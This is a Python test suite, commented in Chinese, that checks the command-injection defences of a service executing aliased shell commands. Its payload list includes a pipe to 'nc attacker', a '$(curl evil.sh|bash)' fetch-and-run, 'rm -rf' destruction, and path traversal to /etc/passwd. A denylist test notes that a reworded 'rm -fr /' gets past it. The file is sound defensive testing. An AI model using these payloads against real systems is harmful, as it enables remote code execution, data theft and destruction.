"""命令注入防线测试 —— 本套件是整个项目最重要的部分。

断言的核心不只是"返回 422"，而是**恶意载荷绝不到达 shell**。因此多数用例同时检查
状态码和实际执行痕迹（输出内容、副作用文件是否被创建）。
"""

from __future__ import annotations

import re

import pytest

from autorun.commands import prepare_alias, prepare_raw, validate_params
from autorun.config import CommandSpec, ParamSpec
from autorun.errors import AliasNotFound, Forbidden, ValidationError

# 每一条都是针对 shell 的真实攻击手法。
INJECTION_PAYLOADS = [
    "v1.0.0; rm -rf /tmp/pwned",     # 命令分隔符
    "v1.0.0 && id",                  # 逻辑与串联
    "v1.0.0 || id",                  # 逻辑或串联
    "v1.0.0 | nc attacker 1234",     # 管道外传
    "$(id)",                         # 命令替换
    "`id`",                          # 反引号替换
    "${IFS}id",                      # 变量展开绕过空格过滤
    "v1.0.0\nid",                    # 换行等价于新的一条命令
    "v1.0.0\rid",                    # 回车
    "v1.0.0\x00id",                  # NUL 截断
    "../../etc/passwd",              # 路径穿越
    "v1.0.0 > /tmp/pwned",           # 输出重定向
    "v1.0.0 & id",                   # 后台执行
    "v1.0.0'; id; '",                # 引号闭合逃逸
    'v1.0.0"; id; "',                # 双引号闭合逃逸
    "v" + "1" * 500,                 # 超长值
    "",                              # 空值
    "v1.0.0 $(curl evil.sh|bash)",   # 组合载荷
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: repr(p)[:40])
def test_injection_payload_rejected_before_shell(cfg, payload):
    """所有注入载荷必须在校验阶段被拒，且不产生任何 PreparedCommand。"""
    with pytest.raises(ValidationError):
        prepare_alias(cfg, "rollback", {"tag": payload})


def test_injection_payloads_have_no_side_effect(client, tmp_path):
    """端到端确认：注入尝试返回 422，且没有任何命令被执行。"""
    marker = tmp_path / "pwned"
    for payload in [f"v1.0.0; touch {marker}", f"v1.0.0 && touch {marker}", "$(id)"]:
        status, body, _ = client.post(
            "/v1/exec", {"alias": "rollback", "params": {"tag": payload}}
        )
        assert status == 422, (payload, body)
        assert body["error"]["code"] == "VALIDATION_ERROR"
    assert not marker.exists(), "注入载荷竟然产生了副作用文件"


def test_legal_value_passes_and_is_quoted(cfg):
    prepared = prepare_alias(cfg, "rollback", {"tag": "v1.4.2"})
    assert prepared.display == "/bin/echo rolling back to v1.4.2"
    assert prepared.argv[:2] == ("/bin/bash", "-lc")


def test_shell_metachars_survive_as_single_argument(client):
    """宽松 pattern 允许 shell 敏感字符时，值必须作为**一个**参数原样到达程序。

    这是 shlex.quote 的正确行为的直接验证：`;` 和 `$HOME` 出现在输出里，说明它们
    被当作字面量传递，而不是被 shell 解释执行。
    """
    value = "a b; whoami $HOME `id`"
    status, body, _ = client.post("/v1/exec", {"alias": "loose", "params": {"msg": value}})
    assert status == 200, body
    tail = body["data"]["output_tail"]
    assert value in tail, tail
    # 若发生了命令替换，输出里会出现 uid= 或家目录路径。
    assert "uid=" not in tail
    assert "/root" not in tail.replace(str(value), "")


def test_undeclared_param_rejected(cfg):
    """未声明的参数是错误，不是"忽略即可" —— 静默忽略会让调用方误以为输入生效。"""
    with pytest.raises(ValidationError, match="不接受参数"):
        prepare_alias(cfg, "rollback", {"tag": "v1.0.0", "extra": "x"})


def test_missing_required_param_rejected(cfg):
    with pytest.raises(ValidationError, match="缺少必填参数"):
        prepare_alias(cfg, "rollback", {})


def test_non_scalar_param_rejected(cfg):
    for bad in ({"a": 1}, ["x"], True, None):
        with pytest.raises(ValidationError):
            prepare_alias(cfg, "rollback", {"tag": bad})


def test_unknown_alias_rejected(cfg):
    with pytest.raises(AliasNotFound):
        prepare_alias(cfg, "no_such_alias", {})


def test_fullmatch_not_search():
    """pattern 必须用 fullmatch 匹配。

    这里的 pattern 缺少结尾锚 `$`。若实现用的是 `re.match`，尾部就能被塞入
    `; rm -rf /` —— 这是本类漏洞最常见的成因。
    """
    spec = CommandSpec(
        name="x",
        shell="/bin/echo {v}",
        params={"v": ParamSpec("v", True, re.compile(r"^v[0-9]+"), 64)},
    )
    with pytest.raises(ValidationError):
        validate_params(spec, {"v": "v1; rm -rf /"})
    assert validate_params(spec, {"v": "v123"}) == {"v": "v123"}


def test_control_characters_always_rejected():
    """即使 pattern 宽松到允许任意字符，控制字符也必须被挡住。"""
    spec = CommandSpec(
        name="x",
        shell="/bin/echo {v}",
        params={"v": ParamSpec("v", True, re.compile(r"(?s)^.*$"), 64)},
    )
    for bad in ["a\x00b", "a\nb", "a\rb", "a\x1bb", "a\x7fb"]:
        with pytest.raises(ValidationError, match="控制字符"):
            validate_params(spec, {"v": bad})
    assert validate_params(spec, {"v": "a b\tc"})["v"] == "a b\tc"


def test_argv_alias_never_uses_shell(cfg):
    prepared = prepare_alias(cfg, "hello", {})
    assert prepared.argv == ("/bin/echo", "hello")
    assert "/bin/bash" not in prepared.argv


def test_timeout_cannot_exceed_server_max(cfg):
    prepared = prepare_alias(cfg, "hello", {}, requested_timeout=999999)
    assert prepared.timeout_sec == cfg.execution.max_timeout_sec
    with pytest.raises(ValidationError):
        prepare_alias(cfg, "hello", {}, requested_timeout=-1)


def test_raw_blocked_when_globally_disabled(make_config):
    cfg = make_config(security={"allow_raw_commands": False})
    with pytest.raises(Forbidden):
        prepare_raw(cfg, "id")


def test_raw_denylist_applies(cfg):
    with pytest.raises(Forbidden, match="拒绝规则"):
        prepare_raw(cfg, "rm -rf /")
    # denylist 是纵深防御而非边界：等价变形能绕过，这是已知且已文档化的限制。
    assert prepare_raw(cfg, "rm -fr / --no-preserve-root").display.startswith("rm -fr")


def test_raw_rejects_nul_and_empty(cfg):
    for bad in ["", "   ", "id\x00", 123, None]:
        with pytest.raises(ValidationError):
            prepare_raw(cfg, bad)
